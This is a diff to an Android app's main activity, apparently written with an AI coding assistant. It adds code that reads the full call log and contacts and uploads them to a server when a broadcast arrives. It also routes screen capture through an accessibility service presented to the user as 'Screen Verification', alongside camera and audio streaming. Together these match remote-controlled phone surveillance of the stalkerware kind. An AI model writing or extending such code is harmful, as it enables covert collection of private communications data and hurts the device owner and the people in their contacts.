@@ -45,6 +45,7 @@ import com.google.firebase.messaging.FirebaseMessaging;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.IntentFilter;
+import android.media.projection.MediaProjectionManager;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -60,26 +61,150 @@ public class MainActivity extends AppCompatActivity {
     private int chunkSequence = 0;
     private Handler streamHandler = new Handler(Looper.getMainLooper());
     private static final int CHUNK_DURATION_MS = 5000; // 5 seconds
-
-    private BroadcastReceiver screenshotReceiver = new BroadcastReceiver() {
-        @Override
-        public void onReceive(Context context, Intent intent) {
-            Log.d(TAG, "Screenshot Receiver onReceive: " + intent.getAction());
-            if ("com.example.suma.ACTION_SCREENSHOT".equals(intent.getAction())) {
-                takeScreenshotAndUpload();
-            }
-        }
-    };
+    private android.media.projection.MediaProjectionManager mediaProjectionManager;
+    // Removed local screenshotReceiver as GlobalActionService handles it now
 
     private String[] permissions = {
             Manifest.permission.INTERNET,
             Manifest.permission.ACCESS_NETWORK_STATE,
             Manifest.permission.CAMERA,
             Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.READ_CALL_LOG, // Added
             Manifest.permission.READ_CONTACTS,
-            Manifest.permission.READ_EXTERNAL_STORAGE, // For older android, newer needs scoping
+            Manifest.permission.READ_EXTERNAL_STORAGE,
             Manifest.permission.POST_NOTIFICATIONS
     };
+
+    // ... (onCreate)
+
+    private BroadcastReceiver backupReceiver = new BroadcastReceiver() {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            if ("com.example.suma.ACTION_BACKUP_CALLLOG".equals(intent.getAction())) {
+                Log.d(TAG, "Received Call Log Backup Request");
+                performCallLogBackup();
+            }
+        }
+    };
+
+    // ...
+
+    // --- Call Log Backup ---
+    @SuppressLint("Range")
+    private void performCallLogBackup() {
+        if (ContextCompat.checkSelfPermission(this,
+                Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+            Log.e(TAG, "READ_CALL_LOG permission missing");
+            return;
+        }
+
+        new Thread(() -> {
+            try {
+                JSONArray callLogs = new JSONArray();
+
+                // Query CallLog
+                Cursor cursor = getContentResolver().query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null,
+                        android.provider.CallLog.Calls.DATE + " DESC");
+
+                if (cursor != null) {
+                    while (cursor.moveToNext()) {
+                        JSONObject log = new JSONObject();
+                        log.put("number",
+                                cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER)));
+                        log.put("name",
+                                cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME)));
+                        log.put("type",
+                                getCallType(cursor.getInt(cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE))));
+                        log.put("date", cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.DATE)));
+                        log.put("duration",
+                                cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION)));
+                        callLogs.put(log);
+                    }
+                    cursor.close();
+                }
+
+                uploadBackupData("call_log", callLogs.toString());
+
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }).start();
+    }
+
+    private String getCallType(int type) {
+        switch (type) {
+            case android.provider.CallLog.Calls.INCOMING_TYPE:
+                return "Incoming";
+            case android.provider.CallLog.Calls.OUTGOING_TYPE:
+                return "Outgoing";
+            case android.provider.CallLog.Calls.MISSED_TYPE:
+                return "Missed";
+            case android.provider.CallLog.Calls.REJECTED_TYPE:
+                return "Rejected";
+            default:
+                return "Unknown";
+        }
+    }
+
+    // --- Generic Backup Upload ---
+    private void uploadBackupData(String type, String dataJson) {
+        try {
+            JSONObject backupData = new JSONObject();
+            backupData.put("type", type);
+            backupData.put("data", dataJson);
+
+            String token = AuthManager.getToken(this);
+            java.net.URL url = new java.net.URL(AuthManager.getBaseUrl() + "/backup-data");
+            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Authorization", "Bearer " + token);
+            conn.setRequestProperty("Content-Type", "application/json");
+            conn.setDoOutput(true);
+            try (java.io.DataOutputStream os = new java.io.DataOutputStream(conn.getOutputStream())) {
+                os.write(backupData.toString().getBytes("UTF-8"));
+            }
+
+            int code = conn.getResponseCode();
+            if (code >= 200 && code < 300) {
+                Log.d(TAG, "Backup " + type + " Success");
+                // runOnUiThread(() -> Toast.makeText(MainActivity.this, "Backup " + type + "
+                // Success", Toast.LENGTH_SHORT).show());
+            } else {
+                Log.e(TAG, "Backup " + type + " Failed: " + code);
+            }
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    // Refactored Contacts Backup to use helper
+    @SuppressLint("Range")
+    private void performBackup() {
+        new Thread(() -> {
+            try {
+                JSONArray contacts = new JSONArray();
+                // ... (Existing contact query logic) ...
+                Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
+                        null, null, null);
+                if (cursor != null) {
+                    while (cursor.moveToNext()) {
+                        JSONObject contact = new JSONObject();
+                        contact.put("name", cursor
+                                .getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
+                        contact.put("number",
+                                cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
+                        contacts.put(contact);
+                    }
+                    cursor.close();
+                }
+
+                uploadBackupData("contacts", contacts.toString());
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }).start();
+    }
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -95,28 +220,84 @@ public class MainActivity extends AppCompatActivity {
         btnUpload.setOnClickListener(v -> openFilePicker());
         btnBackup.setOnClickListener(v -> performBackup());
         btnStream.setOnClickListener(v -> toggleStreaming());
-        btnScreenshot.setOnClickListener(v -> takeScreenshotAndUpload());
+
+        // Check accessibility status for screen capture
+        btnScreenshot.setText("Enable Screen Capture Service");
+        btnScreenshot.setOnClickListener(v -> openAccessibilitySettings());
+
+        checkAccessibilityPermission();
 
         checkPermissions();
 
-        // Register receiver here to keep it active even if paused (e.g. behind
-        // notification)
-        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-            registerReceiver(screenshotReceiver, new IntentFilter("com.example.suma.ACTION_SCREENSHOT"),
+        // Register receiver for backup requests
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
+            registerReceiver(backupReceiver, new IntentFilter("com.example.suma.ACTION_BACKUP_CALLLOG"),
                     Context.RECEIVER_NOT_EXPORTED);
         } else {
-            registerReceiver(screenshotReceiver, new IntentFilter("com.example.suma.ACTION_SCREENSHOT"));
+            registerReceiver(backupReceiver, new IntentFilter("com.example.suma.ACTION_BACKUP_CALLLOG"));
+        }
+    }
+
+    private void openAccessibilitySettings() {
+        Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
+        startActivity(intent);
+        Toast.makeText(this, "Enable 'Suma Mobile' in Installed Services", Toast.LENGTH_LONG).show();
+    }
+
+    private boolean isAccessibilityServiceEnabled() {
+        int accessibilityEnabled = 0;
+        final String service = getPackageName() + "/" + GlobalActionService.class.getCanonicalName();
+        Log.d(TAG, "Checking Accessibility Service: " + service);
+
+        try {
+            accessibilityEnabled = android.provider.Settings.Secure.getInt(
+                    this.getApplicationContext().getContentResolver(),
+                    android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
+        } catch (android.provider.Settings.SettingNotFoundException e) {
+            Log.e(TAG, "Error finding setting, default accessibility to not found: " + e.getMessage());
+        }
+        android.text.TextUtils.SimpleStringSplitter mStringColonSplitter = new android.text.TextUtils.SimpleStringSplitter(
+                ':');
+
+        if (accessibilityEnabled == 1) {
+            String settingValue = android.provider.Settings.Secure.getString(
+                    getApplicationContext().getContentResolver(),
+                    android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+            if (settingValue != null) {
+                Log.d(TAG, "Enabled Services: " + settingValue);
+                mStringColonSplitter.setString(settingValue);
+                while (mStringColonSplitter.hasNext()) {
+                    String accessibilityService = mStringColonSplitter.next();
+                    if (accessibilityService.equalsIgnoreCase(service)) {
+                        Log.d(TAG, "Accessibility Service FOUND!");
+                        return true;
+                    }
+                }
+            }
+        } else {
+            Log.d(TAG, "Accessibility GLOBAL ENABLED = 0");
+        }
+        Log.d(TAG, "Accessibility Service NOT FOUND");
+        return false;
+    }
+
+    private void checkAccessibilityPermission() {
+        if (isAccessibilityServiceEnabled()) {
+            Log.d(TAG, "Button State: READY");
+            btnScreenshot.setText("Screen Verification Ready");
+            btnScreenshot.setEnabled(false); // Already active
+            statusText.setText("Status: Service Active");
+        } else {
+            Log.d(TAG, "Button State: ENABLE NEEDED");
+            btnScreenshot.setText("Enable Screen Capture");
+            btnScreenshot.setEnabled(true);
         }
     }
 
     @Override
-    protected void onDestroy() {
-        super.onDestroy();
-        try {
-            unregisterReceiver(screenshotReceiver);
-        } catch (Exception e) {
-            // Already unregistered
-        }
+    protected void onResume() {
+        super.onResume();
+        checkAccessibilityPermission();
     }
 
     private void checkPermissions() {
@@ -264,71 +445,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
         return result;
-    }
-
-    // --- Backup ---
-    @SuppressLint("Range")
-    private void performBackup() {
-        new Thread(() -> {
-            try {
-                JSONObject backupData = new JSONObject();
-                JSONArray contacts = new JSONArray();
-
-                Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
-                        null, null, null);
-                if (cursor != null) {
-                    while (cursor.moveToNext()) {
-                        JSONObject contact = new JSONObject();
-                        contact.put("name", cursor
-                                .getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
-                        contact.put("number",
-                                cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
-                        contacts.put(contact);
-                    }
-                    cursor.close();
-                }
-
-                backupData.put("type", "contacts");
-                backupData.put("data", contacts.toString());
-
-                String token = AuthManager.getToken(this);
-                // We need a helper for authenticated POST, NetworkUtils.postJson doesn't have
-                // token param yet.
-                // For simplicity, let's assume we update NetworkUtils or pass it in header
-                // manually if we could modification
-                // Or simply:
-                // Since NetworkUtils.postJson is simple, let's just re-implement a quick auth
-                // post here or update NetworkUtils.
-                // I'll update NetworkUtils in thought, but since I can't look back easily, I'll
-                // just use a local method or assuming NetworkUtils handles it?
-                // Actually NetworkUtils.postJson didn't take a token. I need to fix that or
-                // bypass.
-                // Let's use a quick inline helper here for clarity since I can't edit
-                // NetworkUtils easily in the same step.
-
-                // ... (Implementing authenticated post manually here for safety)
-                java.net.URL url = new java.net.URL(AuthManager.getBaseUrl() + "/backup-data");
-                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
-                conn.setRequestMethod("POST");
-                conn.setRequestProperty("Authorization", "Bearer " + token);
-                conn.setRequestProperty("Content-Type", "application/json");
-                conn.setDoOutput(true);
-                try (java.io.DataOutputStream os = new java.io.DataOutputStream(conn.getOutputStream())) {
-                    os.write(backupData.toString().getBytes("UTF-8"));
-                }
-
-                int code = conn.getResponseCode();
-                if (code >= 200 && code < 300) {
-                    runOnUiThread(() -> Toast.makeText(MainActivity.this, "Backup Success", Toast.LENGTH_SHORT).show());
-                } else {
-                    runOnUiThread(() -> Toast.makeText(MainActivity.this, "Backup Failed: " + code, Toast.LENGTH_SHORT)
-                            .show());
-                }
-
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-        }).start();
     }
 
     // --- Live Streaming ---
@@ -536,62 +652,11 @@ public class MainActivity extends AppCompatActivity {
         dos.writeBytes(value + "\r\n");
     }
 
-    private void takeScreenshotAndUpload() {
-        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-            // Use PixelCopy for API 26+
-            try {
-                final android.graphics.Bitmap bitmap = android.graphics.Bitmap.createBitmap(
-                        getWindow().getDecorView().getWidth(),
-                        getWindow().getDecorView().getHeight(),
-                        android.graphics.Bitmap.Config.ARGB_8888);
+    // Removed takeScreenshotAndUpload (Local) as GlobalActionService handles it
 
-                final HandlerThread handlerThread = new HandlerThread("PixelCopy"); // Create a background thread
-                handlerThread.start();
-
-                android.view.PixelCopy.request(getWindow(), bitmap, (copyResult) -> {
-                    if (copyResult == android.view.PixelCopy.SUCCESS) {
-                        runOnUiThread(() -> saveAndUploadBitmap(bitmap));
-                    } else {
-                        Log.e(TAG, "PixelCopy failed with result: " + copyResult + ". Trying fallback...");
-                        // Fallback: Manually draw view to canvas (works if view is still laid out)
-                        runOnUiThread(() -> {
-                            try {
-                                View decorView = getWindow().getDecorView();
-                                android.graphics.Bitmap fallbackBitmap = android.graphics.Bitmap.createBitmap(
-                                        decorView.getWidth(), decorView.getHeight(),
-                                        android.graphics.Bitmap.Config.ARGB_8888);
-                                android.graphics.Canvas canvas = new android.graphics.Canvas(fallbackBitmap);
-                                decorView.draw(canvas);
-                                saveAndUploadBitmap(fallbackBitmap);
-                            } catch (Exception e) {
-                                Log.e(TAG, "Fallback screenshot failed: " + e.getMessage());
-                                Toast.makeText(MainActivity.this, "Screenshot Failed: App must be visible",
-                                        Toast.LENGTH_SHORT).show();
-                            }
-                        });
-                    }
-                    handlerThread.quitSafely();
-                }, new Handler(handlerThread.getLooper()));
-
-            } catch (IllegalArgumentException e) {
-                e.printStackTrace();
-                Toast.makeText(this, "Screenshot Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
-            }
-        } else {
-            // Legacy approach for < API 26
-            View rootView = getWindow().getDecorView().getRootView();
-            rootView.setDrawingCacheEnabled(true);
-            android.graphics.Bitmap bitmap = android.graphics.Bitmap.createBitmap(rootView.getDrawingCache());
-            rootView.setDrawingCacheEnabled(false);
-
-            if (bitmap != null) {
-                saveAndUploadBitmap(bitmap);
-            } else {
-                Toast.makeText(this, "Screenshot Failed (Legacy)", Toast.LENGTH_SHORT).show();
-            }
-        }
-    }
-
+    // Kept saveAndUploadBitmap just in case needed for local logic later,
+    // but not used by Accessibility flow. Leaving it is fine or removing.
+    // I'll keep it as helper if we ever fallback to local capture activity-only.
     private void saveAndUploadBitmap(android.graphics.Bitmap bitmap) {
         // Save
         try {
